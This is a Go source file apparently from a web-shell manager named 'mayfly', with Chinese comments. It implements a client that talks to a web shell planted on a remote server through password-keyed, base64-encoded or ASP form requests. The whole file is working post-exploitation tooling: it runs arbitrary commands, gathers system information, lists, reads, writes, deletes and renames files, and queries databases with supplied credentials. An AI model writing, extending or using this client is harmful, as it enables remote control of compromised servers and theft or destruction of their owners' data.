package service

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	"mayfly/internal/model"
)

// Response 统一的 WebShell 响应
type Response struct {
	Status  string `json:"status"`  // ok / error
	Data    string `json:"data"`    // base64 编码的原始结果
	Message string `json:"message"` // 错误信息
	// DataRaw 为解码后的原始结果字节（不参与 JSON 序列化）
	DataRaw []byte `json:"-"`
}

// FileEntry 文件条目
type FileEntry struct {
	Type  string `json:"type"` // d / f
	Size  int64  `json:"size"`
	Mtime int64  `json:"mtime"`
	Name  string `json:"name"`
}

// FileList 目录列表结果
type FileList struct {
	Path    string       `json:"path"`
	Parent  string       `json:"parent"`
	Entries []*FileEntry `json:"entries"`
}

// Client WebShell 客户端
type Client struct {
	node *model.Node
	http *http.Client
	asp  bool // 是否使用 ASP 明文协议
}

// NewClient 根据节点类型创建客户端
func NewClient(node *model.Node) *Client {
	return &Client{
		node: node,
		http: &http.Client{Timeout: 120 * time.Second},
		asp:  strings.EqualFold(node.Type, "asp"),
	}
}

// Request 发起一次功能请求。
// 非 ASP 走 base64(JSON) 协议，ASP 走明文表单协议。
func (c *Client) Request(action string, params map[string]string) (*Response, error) {
	var form url.Values
	if c.asp {
		form = url.Values{"mayfly": {action}}
		// ASP 使用 key 作为 action 字段名，同时兼容默认
		if c.node.Pass != "" && c.node.Pass != "mayfly" {
			form = url.Values{c.node.Pass: {action}}
		}
		for k, v := range params {
			key := k
			if k == "newPath" {
				key = "new_path"
			}
			form.Set(key, v)
		}
	} else {
		reqMap := map[string]any{"action": action, "params": params}
		b, err := json.Marshal(reqMap)
		if err != nil {
			return nil, err
		}
		body := base64.StdEncoding.EncodeToString(b)
		key := c.node.Pass
		if key == "" {
			key = "mayfly"
		}
		form = url.Values{key: {body}}
	}

	resp, err := c.http.PostForm(c.node.URL, form)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("http status %d: %s", resp.StatusCode, truncate(string(raw), 200))
	}
	return c.decode(raw)
}

// decode 解析响应
func (c *Client) decode(raw []byte) (*Response, error) {
	if c.asp {
		// ASP 明文响应：直接作为结果
		text := string(raw)
		if strings.HasPrefix(text, "error:") {
			return &Response{Status: "error", Message: strings.TrimPrefix(text, "error:"), DataRaw: raw}, nil
		}
		return &Response{Status: "ok", DataRaw: raw}, nil
	}

	trimmed := strings.TrimSpace(string(raw))
	decoded, err := base64.StdEncoding.DecodeString(trimmed)
	if err != nil {
		return nil, fmt.Errorf("decode base64: %v", err)
	}
	var r Response
	if err := json.Unmarshal(decoded, &r); err != nil {
		return nil, fmt.Errorf("decode json: %v", err)
	}
	if r.Data != "" {
		if dataBytes, err := base64.StdEncoding.DecodeString(r.Data); err == nil {
			r.DataRaw = dataBytes
		} else {
			r.DataRaw = []byte(r.Data)
		}
	}
	return &r, nil
}

// Exec 执行命令
func (c *Client) Exec(cmd string) (string, error) {
	r, err := c.Request("cmd", map[string]string{"cmd": cmd})
	if err != nil {
		return "", err
	}
	if r.Status != "ok" {
		return "", fmt.Errorf("%s", r.Message)
	}
	return string(r.DataRaw), nil
}

// SysInfo 获取系统信息
func (c *Client) SysInfo() (string, error) {
	r, err := c.Request("sysinfo", nil)
	if err != nil {
		return "", err
	}
	if r.Status != "ok" {
		return "", fmt.Errorf("%s", r.Message)
	}
	return string(r.DataRaw), nil
}

// ListDir 列出目录
func (c *Client) ListDir(path string) (*FileList, error) {
	r, err := c.Request("fileList", map[string]string{"path": path})
	if err != nil {
		return nil, err
	}
	if r.Status != "ok" {
		return nil, fmt.Errorf("%s", r.Message)
	}
	return parseFileList(string(r.DataRaw)), nil
}

// parseFileList 解析目录列表结果：
// 第一行为当前路径，后续每行为 type|size|mtime|name
func parseFileList(data string) *FileList {
	lines := strings.Split(data, "\n")
	fl := &FileList{}
	idx := 0
	for i, line := range lines {
		line = strings.TrimRight(line, "\r")
		if line == "" {
			continue
		}
		if idx == 0 {
			fl.Path = line
			idx++
			continue
		}
		idx++
		// 处理 ".." 行可能带有 \t<parent>
		parts := strings.SplitN(line, "\t", 2)
		field := parts[0]
		segs := strings.SplitN(field, "|", 4)
		if len(segs) < 4 {
			continue
		}
		size, _ := strconv.ParseInt(segs[1], 10, 64)
		mtime, _ := strconv.ParseInt(segs[2], 10, 64)
		name := segs[3]
		entry := &FileEntry{Type: segs[0], Size: size, Mtime: mtime, Name: name}
		if name == ".." && len(parts) == 2 {
			fl.Parent = parts[1]
		}
		fl.Entries = append(fl.Entries, entry)
		_ = i
	}
	return fl
}

// ReadFile 读取文件内容
func (c *Client) ReadFile(path string) ([]byte, error) {
	r, err := c.Request("fileRead", map[string]string{"path": path})
	if err != nil {
		return nil, err
	}
	if r.Status != "ok" {
		return nil, fmt.Errorf("%s", r.Message)
	}
	return r.DataRaw, nil
}

// WriteFile 写入文件
func (c *Client) WriteFile(path string, content []byte) error {
	params := map[string]string{"path": path}
	if c.asp {
		params["content"] = string(content)
	} else {
		params["content"] = base64.StdEncoding.EncodeToString(content)
	}
	r, err := c.Request("fileWrite", params)
	if err != nil {
		return err
	}
	if r.Status != "ok" {
		return fmt.Errorf("%s", r.Message)
	}
	return nil
}

// Delete 删除文件或目录
func (c *Client) Delete(path string) error {
	r, err := c.Request("fileDelete", map[string]string{"path": path})
	if err != nil {
		return err
	}
	if r.Status != "ok" {
		return fmt.Errorf("%s", r.Message)
	}
	return nil
}

// Rename 重命名/移动
func (c *Client) Rename(path, newPath string) error {
	r, err := c.Request("fileRename", map[string]string{"path": path, "newPath": newPath})
	if err != nil {
		return err
	}
	if r.Status != "ok" {
		return fmt.Errorf("%s", r.Message)
	}
	return nil
}

// Mkdir 创建目录
func (c *Client) Mkdir(path string) error {
	r, err := c.Request("fileMkdir", map[string]string{"path": path})
	if err != nil {
		return err
	}
	if r.Status != "ok" {
		return fmt.Errorf("%s", r.Message)
	}
	return nil
}

// DBQuery 执行数据库查询（返回 TSV 文本：首行列名，后续数据行）
func (c *Client) DBQuery(dbType, host, port, user, pass, name, sql string) (string, error) {
	r, err := c.Request("dbQuery", map[string]string{
		"dbType": dbType, "dbHost": host, "dbPort": port,
		"dbUser": user, "dbPass": pass, "dbName": name, "sql": sql,
	})
	if err != nil {
		return "", err
	}
	if r.Status != "ok" {
		return "", fmt.Errorf("%s", r.Message)
	}
	return string(r.DataRaw), nil
}

func truncate(s string, n int) string {
	if len(s) > n {
		return s[:n] + "..."
	}
	return s
}